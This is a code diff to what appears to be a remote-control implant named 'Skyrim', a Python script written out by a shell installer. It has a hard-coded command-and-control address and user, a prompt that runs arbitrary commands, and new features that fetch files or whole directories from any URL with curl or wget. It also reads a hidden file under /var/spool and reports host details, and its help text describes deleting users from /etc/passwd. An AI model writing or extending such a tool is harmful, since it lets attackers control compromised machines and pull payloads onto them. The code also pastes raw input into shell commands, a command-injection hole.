@@ -15,6 +15,11 @@ from sys import argv
 CnC = "192.168.102.16"
 CnCUser = "sysadmin"
 inVal = ""
+inDir = ""
+inFil = ""
+option = ""
+link = ""
+num = ""
 def main():
     cont = True
     os.system("clear")
@@ -67,8 +72,32 @@ def main():
                 inVal = input("Command@Skyrim# ")
                 if(inVal.lower() in ("exit")):
                     x = False
+                elif(inVal.lower() in ('h', 'help')
+                    os.system("cat /var/spool/.log.sh")
+                elif(inVal.lower() in ("info")):
+                    print(os.uname())
                 else:
                     os.system(inVal)
+        elif(value.lower() in ('d')):
+            print("Downloading.....")
+            option = input("(F)ile or (D)irectory: ")
+            if(option.lower() in ('f')):       
+                inFil = input("Enter name of file to place download in: ")
+                inDir = input("Enter directory to place file in(proper directory format, no end /): ")
+                link = input("Enter full url to download from: ")
+                os.system("curl -o "+inDir+"/"+inFil+ " "+link)
+            elif(option.lower() in ('d')):
+                inDir = input("Enter directory to download to(proper directory format): ") 
+                link = input("Enter full url to download from: ")
+                option = input("Recursion(digs through subdirectories): ")
+                if(option.lower() in ('y')):
+                    num = input("How much depth(how many levels of subdirectories): ")
+                    os.system("mkdir "+inDir)
+                    os.system("wget -P "+inDir+ " -r -l "+num+" "+link)
+                else:
+                    os.system("mkdir "+inDir)
+                    os.system("wget -P "+inDir+ " "+link)
+                
 main()
 EOFA
 fi
@@ -89,6 +118,13 @@ u -- Uninstall. Will uninstall the program from the machine, along with sending 
 r -- Remove. Will list current users in /etc/passwd and prompts the user for a name to delete.
 
 c -- Command-Line. Enables command-line commands through the controller.
+
+d -- Download. Downloads files and/or directories from a specified url.
+
+
+Console Commands:
+
+info -- Displays system information, including OS name, machine's network name, OS release/version, and hardware identifier.
 
 
 EOFB
